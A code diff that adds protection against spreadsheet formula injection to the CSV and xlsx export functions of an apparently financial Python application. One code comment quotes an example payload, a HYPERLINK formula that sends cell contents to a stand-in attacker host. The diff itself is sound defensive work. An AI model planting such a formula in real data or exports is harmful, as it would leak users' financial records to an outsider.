@@ -131,12 +131,31 @@ def build(db: Session, user: User, dataset: str, range_key: str,
     return headers, rows, "dividends"
 
 
+# Excel and LibreOffice treat a cell whose text starts with one of these as a
+# formula, so an account named `=HYPERLINK("http://attacker/?"&A1,"x")` would
+# execute when the accountant opens the export. A leading apostrophe forces the
+# cell to be read as text in both.
+FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+
+
+def sanitize_cell(value):
+    """Neutralise spreadsheet formula injection in a text cell.
+
+    Only strings are at risk: numbers and dates are written as typed values and
+    are never re-parsed as formulas.
+    """
+    if isinstance(value, str) and value.startswith(FORMULA_LEAD):
+        return "'" + value
+    return value
+
+
 def to_csv(headers: list[str], rows: list[list]) -> bytes:
     buf = io.StringIO()
     writer = csv.writer(buf, lineterminator="\r\n")
     writer.writerow(headers)
     for row in rows:
-        writer.writerow(["" if v is None else (v.isoformat() if isinstance(v, date) else v)
+        writer.writerow(["" if v is None
+                         else (v.isoformat() if isinstance(v, date) else sanitize_cell(v))
                          for v in row])
     # BOM so Excel opens UTF-8 CSV without mangling non-ASCII
     return b"\xef\xbb\xbf" + buf.getvalue().encode("utf-8")
@@ -173,7 +192,14 @@ def to_xlsx(headers: list[str], rows: list[list], sheet_title: str,
         cell.alignment = Alignment(horizontal="center")
 
     for row in rows:
-        ws.append(row)
+        ws.append([sanitize_cell(v) for v in row])
+    # openpyxl types a string starting with "=" as a real formula, so the xlsx
+    # path needs the same treatment as the csv one — and gets no "enable
+    # content" prompt to slow it down.
+    for row_cells in ws.iter_rows(min_row=header_row + 1):
+        for cell in row_cells:
+            if isinstance(cell.value, str):
+                cell.data_type = "s"
 
     money = '#,##0.00;[Red]-#,##0.00'
     for col, name in enumerate(headers, start=1):
